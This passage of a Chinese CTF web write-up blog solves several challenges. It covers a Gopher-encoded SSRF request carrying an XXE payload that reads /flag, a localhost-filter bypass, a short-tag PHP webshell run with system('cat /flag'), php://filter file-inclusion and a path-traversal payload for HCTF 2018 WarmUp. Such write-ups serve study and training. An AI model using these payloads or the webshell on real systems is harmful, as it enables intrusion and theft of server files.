<p>可以<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">通过Gopher协议构造一个HTTP-POST请求</a>，这样的请求需要几个参数：POST HOST CONTENT-TYPE CONTENT-LENGTH</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /xxe.php HTTP/1.1</span><br><span class="line">Host: www.sudo.cc</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 178</span><br></pre></td></tr></table></figure>

<p>这里的POST是指向&#x2F;xxe.php，声明使用HTTP&#x2F;1.1，Host必然需要指明，是需要访问的主机。Content-Type中，Gopher支持application&#x2F;x-www-form-urlencoded和multipart&#x2F;form-data。Content-Length是内容长度。</p>
<h4 id="绕过对127-0-0-1的限制"><a href="#绕过对127-0-0-1的限制" class="headerlink" title="绕过对127.0.0.1的限制"></a>绕过对127.0.0.1的限制</h4><p>一开始看到那个输入框有限制，限制了127.0.0.1和localhost。那么可以尝试绕过。<a target="_blank" rel="noopener" href="https://tttang.com/archive/1648/#toc__10">绕过方式</a>可以是<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/43348582">使用短链接</a>（30x跳转绕过），使用<a target="_blank" rel="noopener" href="http://www.sudo.cc%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%98%AF%E6%B7%BB%E5%8A%A0@使用http身份鉴别协议,可以是句点替代,省略0等.这里采用www.sudo.cc./">www.sudo.cc，可以是添加@使用http身份鉴别协议，可以是句点替代，省略0等。这里采用www.sudo.cc。</a></p>
<p>总的包为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /xxe.php HTTP/1.1</span><br><span class="line">Host: www.sudo.cc</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 178</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>通过<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45887311/article/details/107327706">网上搜的脚本</a>将其转为Gopher包。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">test =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /xxe.php HTTP/1.1</span></span><br><span class="line"><span class="string"> ... xxe payload ...</span></span><br><span class="line"><span class="string">&lt;/root&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>) <span class="comment">#Gopher特色</span></span><br><span class="line">result = <span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>前面接上要访问的地址，完成最终的payload。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://www.sudo.cc:80/_POST%20/xxe.php%20HTTP/1.1%0D%0AHost%3A%20www.sudo.cc%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%20178%0D%0A%0D%0A%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0D%0A%3C%21DOCTYPE%20foo%20%5B%0D%0A%20%20%3C%21ENTITY%20xxe%20SYSTEM%20%22php%3A//filter/convert.base64-encode/resource%3D/flag%22%3E%0D%0A%5D%3E%0D%0A%3Croot%3E%0D%0A%20%20%3Cname%3E%26xxe%3B%3C/name%3E%0D%0A%3C/root%3E%0D%0A</span><br></pre></td></tr></table></figure>


<p>将这个payload放到index的文本框里让其访问发包，就能读取&#x2F;flag内容并且显示在本页面了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK Date: Tue, 05 Dec 2023 02:38:43 GMT Server: Apache/2.4.57 (Debian) X-Powered-By: PHP/8.3.0 Vary: Accept-Encoding Content-Length: 196 Content-Type: text/html; charset=UTF-8</span><br><span class="line">Deprecated: Function libxml_disable_entity_loader() is deprecated in /var/www/html/xxe.php on line 7</span><br><span class="line">U0NVQ1RGezJjNjI0MzNlLTlhZTUtNDY0ZC1iMzA4LTQ5YTZjYjI1MmI4YX0K</span><br></pre></td></tr></table></figure>

<h3 id="hard-upload"><a href="#hard-upload" class="headerlink" title="hard_upload"></a>hard_upload</h3><h4 id="和easy-upload一样的解法"><a href="#和easy-upload一样的解法" class="headerlink" title="和easy upload一样的解法"></a>和easy upload一样的解法</h4><p>不过是过滤的时候，过滤了“php”和“\t”，只需将马换做短标签就行了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传-访问-加一个get参数，?a&#x3D;system(‘cat &#x2F;flag’);，就出了。</p>
<h2 id="BUUCTF-简单题快速过"><a href="#BUUCTF-简单题快速过" class="headerlink" title="BUUCTF 简单题快速过"></a>BUUCTF 简单题快速过</h2><h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p>打开文件，有个提示tips，点进去发现是一个?file&#x3D;flag.php，一眼文件包含，尝试使用php伪协议读文件，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<p>然后读到了flag.php的源码，解码即得到flag</p>
<h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>f12看到提示source.php 和 hint.php。其中hint.php提示flag文件是ffffllllaaaagggg。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其需要传一个file，$_REQUEST[]为$_GET[]，$_POST[]等的组合。传入file后被送入checkFile进行检查，需要返回false。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这段PHP代码是用来截取字符串的。具体来说，它会从变量 $page 中截取一个子字符串，该子字符串的起始位置是 0，结束位置是第一个问号的位置（如果 $page 中没有问号，则返回整个字符串）。截取后的子字符串将被赋值给变量 $_page。这段代码使用了 PHP 内置函数 mb_substr() 和 mb_strpos()，它们分别用于截取字符串和查找字符串中的子字符串。</p>
</blockquote>
<blockquote>
<p>mb_strpos() 函数用于查找一个字符串在另一个字符串中首次出现的位置，返回值是该字符串在另一个字符串中的索引位置。mb_substr() 函数用于截取一个字符串的一部分，返回值是截取后的子字符串。这两个函数都是 PHP 中的内置函数，其中 mb_ 前缀表示这些函数是多字节字符集（Multibyte String）函数，适用于 Unicode 字符集。</p>
</blockquote>
<p>那么，在问号前的文件就需要是hint.php或者是source.php。</p>
<p>构造payload为?source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</p>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/friends/">friends</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web%E6%9D%82%E7%BB%83"><span class="toc-number">1.</span> <span class="toc-text">web杂练</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ISCTF2023"><span class="toc-number">1.1.</span> <span class="toc-text">ISCTF2023</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#serialize"><span class="toc-number">1.1.1.</span> <span class="toc-text">serialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wafr"><span class="toc-number">1.1.2.</span> <span class="toc-text">wafr</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SCUCTF2023"><span class="toc-number">1.2.</span> <span class="toc-text">SCUCTF2023</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2048"><span class="toc-number">1.2.1.</span> <span class="toc-text">2048</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lessismore"><span class="toc-number">1.2.2.</span> <span class="toc-text">lessismore</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E8%B0%83%E7%A0%94%E5%92%8C%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">前期调研和信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Less%E6%96%87%E6%A1%A3%E7%A0%94%E8%AF%BB"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">Less文档研读</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%E7%BC%96%E5%86%99"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">payload编写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E5%88%B0%E7%9A%84%E8%B5%84%E6%BA%90"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">用到的资源</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tarit"><span class="toc-number">1.2.3.</span> <span class="toc-text">tarit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E7%A0%94%E5%92%8C%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">调研和信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E5%B0%9D%E8%AF%95"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">方案尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">最终解决方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebBuilder"><span class="toc-number">1.2.4.</span> <span class="toc-text">WebBuilder</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E4%BB%A3%E7%A0%81%EF%BC%9A%E5%AF%B9API%E7%9A%84%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">审计代码：对API的测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E4%BB%A3%E7%A0%81%EF%BC%9A%E9%80%9A%E8%BF%87API%E6%B5%8B%E8%AF%95"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">编写代码：通过API测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E4%BB%A3%E7%A0%81%EF%BC%9A%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8CXSS%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">审计代码：如何进行XSS攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E5%88%86%E6%9E%90"><span class="toc-number">1.2.4.4.</span> <span class="toc-text">最终分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E9%A1%B5%E9%9D%A2%E7%BC%96%E5%86%99"><span class="toc-number">1.2.4.5.</span> <span class="toc-text">XSS漏洞页面编写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flask%E5%90%8E%E7%AB%AF%E7%BC%96%E5%86%99"><span class="toc-number">1.2.4.6.</span> <span class="toc-text">flask后端编写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E5%8A%A8%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.4.7.</span> <span class="toc-text">发动攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%80%E6%9C%89%E5%90%8E%E7%AB%AF%E7%9A%84flask%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.4.8.</span> <span class="toc-text">所有后端的flask代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyphp"><span class="toc-number">1.2.5.</span> <span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easysql"><span class="toc-number">1.2.6.</span> <span class="toc-text">easysql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E7%9A%84%E5%B0%9D%E8%AF%95"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">错误的尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">解决方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-upload"><span class="toc-number">1.2.7.</span> <span class="toc-text">ez_upload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-number">1.2.7.2.</span> <span class="toc-text">几次尝试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9A%E5%B0%9D%E8%AF%95%E6%8A%8Aphp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%86%99%E5%88%B0headers%E9%87%8C"><span class="toc-number">1.2.7.3.</span> <span class="toc-text">解法1：尝试把php命令执行代码写到headers里</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A%E5%B0%9D%E8%AF%95%E6%8A%8Aphp%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E5%86%99%E5%88%B0get%E5%8F%82%E6%95%B0%E9%87%8C"><span class="toc-number">1.2.7.4.</span> <span class="toc-text">解法2：尝试把php命令执行代码命令写到get参数里</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-web"><span class="toc-number">1.2.8.</span> <span class="toc-text">ez_web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0XXE"><span class="toc-number">1.2.8.2.</span> <span class="toc-text">构造XXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0SSRF%EF%BC%9AGopher"><span class="toc-number">1.2.8.3.</span> <span class="toc-text">构造SSRF：Gopher</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%AF%B9127-0-0-1%E7%9A%84%E9%99%90%E5%88%B6"><span class="toc-number">1.2.8.4.</span> <span class="toc-text">绕过对127.0.0.1的限制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hard-upload"><span class="toc-number">1.2.9.</span> <span class="toc-text">hard_upload</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%92%8Ceasy-upload%E4%B8%80%E6%A0%B7%E7%9A%84%E8%A7%A3%E6%B3%95"><span class="toc-number">1.2.9.1.</span> <span class="toc-text">和easy upload一样的解法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BUUCTF-%E7%AE%80%E5%8D%95%E9%A2%98%E5%BF%AB%E9%80%9F%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">BUUCTF 简单题快速过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="toc-number">1.3.1.</span> <span class="toc-text">[ACTF2020 新生赛]Include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">1.3.2.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&text=ctf-web一些杂练（24.5之前）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&title=ctf-web一些杂练（24.5之前）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&is_video=false&description=ctf-web一些杂练（24.5之前）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ctf-web一些杂练（24.5之前）&body=Check out this article: http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&title=ctf-web一些杂练（24.5之前）"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&title=ctf-web一些杂练（24.5之前）"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&title=ctf-web一些杂练（24.5之前）"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&title=ctf-web一些杂练（24.5之前）"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&name=ctf-web一些杂练（24.5之前）&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/05/05/ctf-web%E4%B8%80%E4%BA%9B%E6%9D%82%E7%BB%83%EF%BC%8824-5%E4%B9%8B%E5%89%8D%EF%BC%89/&t=ctf-web一些杂练（24.5之前）"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2025
    ShuiChang
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/friends/">friends</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/ShuiChang2019">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



